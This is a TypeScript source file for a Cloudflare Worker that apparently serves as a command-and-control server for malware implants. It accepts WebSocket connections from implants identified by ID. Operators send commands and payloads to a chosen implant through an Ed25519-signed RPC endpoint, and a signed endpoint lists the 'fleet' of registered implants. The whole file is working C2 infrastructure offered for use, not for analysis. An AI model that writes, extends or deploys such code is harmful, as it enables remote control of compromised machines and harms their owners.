import { Hono } from 'hono';
import { ed25519 } from '@noble/curves/ed25519';

// Cloudflare Environment bindings
export interface Env {
  IMPLANT_STATE: DurableObjectNamespace;
  STORAGE: R2Bucket;
  FLEET_CONFIG: KVNamespace;
  OPERATOR_PUBKEY: string;
}

const app = new Hono<{ Bindings: Env }>();

// 1. Implant Transport Endpoint (WebSocket Upgrade)
app.get('/t/:transport/:implantId', async (c) => {
  const upgradeHeader = c.req.header('Upgrade');
  if (upgradeHeader !== 'websocket') {
    return c.text('Expected Upgrade: websocket', 426);
  }

  const implantId = c.req.param('implantId');
  const transport = c.req.param('transport');

  const id = c.env.IMPLANT_STATE.idFromName(implantId);
  const stub = c.env.IMPLANT_STATE.get(id);

  // `stub.fetch(c.req.raw)` does NOT deliver a usable socket: a Durable Object
  // fetch response cannot carry a WebSocket stream back into the Worker, so the
  // previous code "worked" only by the DO inventing a pair nothing was attached to.
  // Create the pair here, hand the server half to the DO as a hibernatable socket,
  // and return the client half to the implant.
  const pair = new WebSocketPair();
  const [client, server] = Object.values(pair) as [WebSocket, WebSocket];

  const init: RequestInit = { method: 'GET', headers: c.req.raw.headers };
  (init as Record<string, unknown>).webSocket = server;

  const res = await stub.fetch(
    new Request(`https://implant-state/${implantId}/${transport}`, init)
  );

  if (res.status !== 101) {
    const detail = await res.text().catch(() => '');
    try { client.close(); } catch { /* already closed */ }
    return new Response(`DO rejected websocket: status=${res.status} body=${detail}`,
      { status: 502 });
  }

  return new Response(null, { status: 101, webSocket: client });
});

// 2. Operator RPC API (signed with Ed25519)
app.post('/api/rpc', async (c) => {
  const sigHex = c.req.header('X-Signature');
  const timestamp = c.req.header('X-Timestamp');

  if (!sigHex || !timestamp) {
    return c.json({ error: 'Missing X-Signature or X-Timestamp header' }, 401);
  }

  // Replay protection: reject requests older than 60 seconds
  const now = Math.floor(Date.now() / 1000);
  const ts = parseInt(timestamp);
  if (Math.abs(now - ts) > 60) {
    return c.json({ error: 'Timestamp too old. Replay attack?' }, 401);
  }

  const body = await c.req.text();

  // Verify Ed25519 signature: sign(timestamp + body)
  const message = new TextEncoder().encode(timestamp + body);
  const signature = Uint8Array.from(sigHex.match(/.{2}/g)!.map((h: string) => parseInt(h, 16)));
  const pubkey = Uint8Array.from(
    (c.env.OPERATOR_PUBKEY).match(/.{2}/g)!.map((h: string) => parseInt(h, 16))
  );

  let isValid = false;
  try {
    isValid = ed25519.verify(signature, message, pubkey);
  } catch (e) {
    return c.json({ error: 'Signature verification failed' }, 401);
  }

  if (!isValid) {
    return c.json({ error: 'Invalid signature' }, 403);
  }

  // Parse the verified request
  const { implantId, command, payload } = JSON.parse(body);

  const id = c.env.IMPLANT_STATE.idFromName(implantId);
  const stub = c.env.IMPLANT_STATE.get(id);

  // Forward to DO with command name in the body
  return stub.fetch(new Request('http://do/rpc', {
    method: 'POST',
    body: JSON.stringify({ command, payload: { ...payload, implantId } }),
  }));
});

// 3. Fleet listing (returns all known implants from KV)
app.get('/api/fleet', async (c) => {
  const sigHex = c.req.header('X-Signature');
  const timestamp = c.req.header('X-Timestamp');
  if (!sigHex || !timestamp) {
    return c.json({ error: 'Unauthorized' }, 401);
  }
  const now = Math.floor(Date.now() / 1000);
  const ts = parseInt(timestamp);
  if (Math.abs(now - ts) > 60) {
    return c.json({ error: 'Timestamp too old' }, 401);
  }
  const body = 'fleet';
  const message = new TextEncoder().encode(timestamp + body);
  const signature = Uint8Array.from(sigHex.match(/.{2}/g)!.map((h: string) => parseInt(h, 16)));
  const pubkey = Uint8Array.from(
    (c.env.OPERATOR_PUBKEY).match(/.{2}/g)!.map((h: string) => parseInt(h, 16))
  );
  try {
    if (!ed25519.verify(signature, message, pubkey)) {
      return c.json({ error: 'Invalid signature' }, 403);
    }
  } catch (e) {
    return c.json({ error: 'Signature failed' }, 401);
  }

  // List implants from KV (operator registers implants by ID)
  const list = await c.env.FLEET_CONFIG.list();
  const implants = [];
  for (const key of list.keys) {
    const data = await c.env.FLEET_CONFIG.get(key.name);
    if (data) {
      implants.push(JSON.parse(data));
    }
  }
  return c.json({ implants });
});

// Export DO + default app
export { ImplantDO } from './durable-object';
export default app;
